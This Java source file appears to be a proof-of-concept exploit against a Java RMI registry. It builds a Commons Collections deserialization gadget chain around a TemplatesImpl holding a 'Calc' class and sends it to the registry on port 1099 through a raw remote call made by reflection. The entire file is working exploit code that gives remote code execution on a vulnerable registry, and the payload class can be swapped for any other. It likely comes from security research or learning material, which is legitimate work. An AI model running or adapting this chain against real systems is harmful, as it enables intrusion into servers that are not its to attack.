package RMI.CAR;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.rmi.server.UnicastRef;
import util.Calc;
import util.Utils;

import java.io.ObjectOutput;
import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.util.HashMap;
import java.util.Map;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.creatTemplatesImpl(Calc.class);
        Transformer invokerTransformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);
        HashMap expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");
        outerMap.clear();
        Utils.setFieldValue(invokerTransformer, "iMethodName", "newTransformer");
        Registry registry = LocateRegistry.getRegistry(1099);

        Field field1 = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
        field1.setAccessible(true);
        UnicastRef ref = (UnicastRef) field1.get(registry);

        Field field2 = registry.getClass().getDeclaredField("operations");
        field2.setAccessible(true);
        Operation[] operations = (Operation[]) field2.get(registry);

        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(expMap);
        ref.invoke(var2);
    }
}
